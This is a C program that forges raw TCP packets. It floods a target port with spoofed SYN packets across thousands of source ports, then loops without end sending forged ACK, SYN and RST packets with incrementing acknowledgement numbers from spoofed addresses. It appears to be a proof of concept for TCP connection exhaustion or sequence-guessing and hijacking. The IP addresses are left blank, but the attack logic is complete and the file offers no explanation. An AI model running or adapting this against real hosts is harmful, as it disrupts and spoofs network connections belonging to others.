#include "include/socketManager.h"
#include "include/packetForger.h"
#include "include/str_replace.h"
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <stdbool.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>

int main(int argc, char **argv) {

    struct timespec ts={.tv_nsec=0};
    time_t mytime = time(NULL);
    char * time_str = ctime(&mytime);
    time_str[strlen(time_str)-1] = '\0';
    printf("Current Time : %s\n***********************\n", time_str);


    char *srcip1 = ""; 
    char *dstip1 = ""; 
    int src_port1 = 13000;
    char *srcip2 = ""; 
    char *dstip2 = ""; 
    int src_port2 = 60020;

    
    int seq = 1;
    char s_ack[16];

    u_int32_t ack_number = 13338;


    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    int one = 1;
    const int *val = &one;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0){
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
	    exit(0);
    }

    int sendbuff=1048576;
    if(setsockopt(sock,SOL_SOCKET,SO_SNDBUF,&sendbuff,sizeof(sendbuff))<0)
    {
        printf ("Error setting sendbuff. Error number : %d . Error message : %s \n" , errno , strerror(errno));
	    exit(0);
    }


    char *payload="";
    int padding_start_port=13000;
    int padding_length = 4096;
    int bunch = 8;
    int bunch_size = padding_length / bunch;
    
    int len1 = padding_length/bunch + 50; 
    int len2 = padding_length - len1;


    for(int m=0;m<20;m++){
        for(int i=0;i<padding_length;i++)
        {
            rawsocket_send(sock, build_tcp_packet(padding_start_port+i, 8001, srcip1, dstip1, 0, 0, 512, SYN, payload)); // SYN
        }
        usleep(500000);
    }


    {
        struct timespec ts={.tv_nsec=0};
        time_t mytime = time(NULL);
        char * time_str = ctime(&mytime);
        time_str[strlen(time_str)-1] = '\0';
        printf("Current Time : %s\n***********************\n", time_str);
    }

    padding_start_port=13000;
    int curr_counter = 0;
    while(true)
    {        
        for(int i=padding_start_port; i<padding_start_port+len1; i++)
        {
            rawsocket_send(sock, build_tcp_packet(i, 8001, srcip1, dstip1, 0, 0, 512, SYN, payload));
        }

        curr_counter+=1;

        if (curr_counter>=5){
            for(int i=padding_start_port+len1; i < padding_start_port+padding_length; i++)
            {
                rawsocket_send(sock, build_tcp_packet(i, 8001, srcip1, dstip1, 0, 0, 512, SYN, payload));
            }
            curr_counter =0;
        }
    

        for(int i=0; i<10000; i++){
            rawsocket_send(sock, build_tcp_packet(src_port1, 8001, srcip1, dstip1, seq, ack_number, 512, ACK, payload));
            rawsocket_send(sock, build_tcp_packet(src_port2, 8001, srcip2, dstip2, ack_number, ack_number,512,SYN,payload)); // SYN
            rawsocket_send(sock, build_tcp_packet(src_port2, 8001, srcip2, dstip2, ack_number+1, ack_number+1,512,RST,payload)); // RST
            rawsocket_send(sock, build_tcp_packet(src_port2, 8001, srcip2, dstip2, ack_number, ack_number,512,SYN,payload)); // SYN
            rawsocket_send(sock, build_tcp_packet(src_port2, 8001, srcip2, dstip2, ack_number+1, ack_number+1,512,RST,payload)); // RST
            
            ack_number = ack_number + 1;
        }
    }
}
